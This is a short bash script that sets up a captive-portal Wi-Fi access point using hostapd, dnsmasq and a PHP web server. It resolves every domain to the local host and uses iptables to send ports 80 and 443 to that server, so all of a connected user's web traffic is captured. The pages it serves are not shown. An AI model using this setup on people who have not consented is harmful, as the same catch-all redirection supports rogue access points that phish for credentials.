#!/bin/bash

killall dnsmasq
killall hostapd
killall apache2
killall php

# TESTER LE NOMBRE D'ARGUMENT
if [ ! $# -eq 3 ]; then
    clear
    echo "USAGE: CAPTIVE.sh [SSID] [PASS] [INTERFACE]"
    exit 1
fi


# STATIC ADDR FOR INTERFACE
ifconfig $3 192.168.0.1 netmask 255.255.255.0

# CONFIGURATION DU POINT D'ACCES WLAN
echo "
country_code=GB
interface=$3
ssid=$1
hw_mode=g
channel=7
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=$2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP

">hostapd.conf

#CONFIGURATION DNSMASQ
echo "
domain-needed
bogus-priv
listen-address=192.168.0.1
interface=$3
expand-hosts
domain=router.lan
bind-interfaces
dhcp-range=192.168.0.2,192.168.0.254,48h
dhcp-authoritative
dhcp-option=3,192.168.0.1
dhcp-option=19,0
no-resolv
no-poll
address=/#/192.168.0.1

">dnsmasq.conf

#STARTING AP
hostapd hostapd.conf &
#STARTING DNSMASQ
dnsmasq -C dnsmasq.conf &
#STARTING SERVER
php -S 192.168.0.1:80 /root/www/* &

iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.0.1:80 &
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.0.1:80 &
